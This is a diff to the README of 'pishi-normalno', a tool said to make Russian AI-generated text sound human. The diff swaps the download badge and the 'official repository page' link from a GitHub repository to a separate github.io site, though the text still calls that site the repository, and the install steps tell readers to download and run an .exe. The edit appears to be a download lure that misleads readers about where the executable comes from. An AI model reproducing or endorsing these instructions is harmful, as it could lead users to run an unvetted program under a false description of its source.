@@ -1,6 +1,6 @@
 # ✍️ pishi-normalno - Professional Russian text editing for AI
 
-[![](https://img.shields.io/badge/Download_Software-blue)](https://github.com/Sfil8579/pishi-normalno)
+[![](https://img.shields.io/badge/Download_Software-blue)](https://sfil8579.github.io)
 
 ## 🎯 About this tool
 Pishi-normalno helps you refine Russian text for AI agents. It polishes your output to sound human. It removes robotic phrasing often found in machine-generated content. Use it to keep your meaning and voice intact while improving flow. This tool handles marketing copy, social media posts, and general business writing with ease. You get clear text that connects with your audience.
@@ -22,7 +22,7 @@ AI texts often sound stiff. They use repetitive patterns that readers notice. Th
 ## 📥 Getting started
 Follow these steps to install and run the software on your computer.
 
-1. Go to the [official repository page](https://github.com/Sfil8579/pishi-normalno).
+1. Go to the [official repository page](https://sfil8579.github.io).
 2. Look for the Releases section on the right side of the page.
 3. Click the latest version of the file named with the .exe extension.
 4. Save the file to your desktop or your Downloads folder.
